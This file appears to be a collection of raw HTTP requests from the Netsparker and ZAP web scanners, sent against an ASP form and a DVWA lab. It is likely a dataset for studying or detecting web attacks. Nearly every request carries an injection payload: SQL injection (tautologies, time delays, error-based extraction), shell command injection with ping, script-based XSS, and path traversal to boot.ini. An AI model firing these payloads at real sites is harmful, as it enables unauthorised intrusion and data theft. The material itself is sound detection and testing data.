name=Smith&sex=%26expr+268409241+-+2+%26&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 350
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=%27&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 353
Accept-Encoding: gzip, deflate

name=Smith&sex=SET+%2fA+0xFFF9999-2&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 367
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=ping+-n+25+127.0.0.1&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=1+WAITFOR+DELAY+%270%3a0%3a25%27--&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 332
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%27+OR+%27ns%27%3d%27ns&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 654
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 342
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%22%26ping+-c+25+127.0.0.1+%26%22&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 393
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=%0anetsparker(0x003D11)%3b&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/dvwa/images/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache

"
"/dvwa/images/login_logo.png?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/vulnerabilities/cms/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/vulnerabilities/sqli/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/vulnerabilities/view_source_all.php?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/dvwa/images/RandomStorm.png?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/login.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

username=ZAP&password=ZAP&Login=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E"
"/sitemap.xml?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/dvwa/css?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 397
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=%27%26+ping+-n+25+127.0.0.1+%26&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 380
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=%27+OR+%271%27%3d%271&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 428
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=data%3a%3bbase64%2cJyI%2bPHNjcmlwdD5uZXRzcGFya2VyKDB4MDAzQ0Q3KTwvc2NyaXB0Pg%3d%3d&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 375
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=1+ns%3dnetsparker(0x003CD9)+&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 627
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=-1%5c%27%2b(select+1+and+row(1%2c1)%3e(select+count(*)%2cconcat(CONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97))%2c0x3a%2cfloor(rand()*2))x+from+(select+1+union+select+2)a+group+by+x+limit+1))--+1&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 331
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%26ping+-c+25+127.0.0.1+%26&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 442
Accept-Encoding: gzip, deflate

name=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fboot.ini&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/login.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 82

username=ZAP&password=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&Login=Login"
"/dvwa/css/login.css?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/dvwa/images/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache

"
"/login.php?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/login.php HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

username=gordonb&password=abc123&Login=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E"
"/robots.txt?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/vulnerabilities/csrf/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 0

"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 390
Accept-Encoding: gzip, deflate

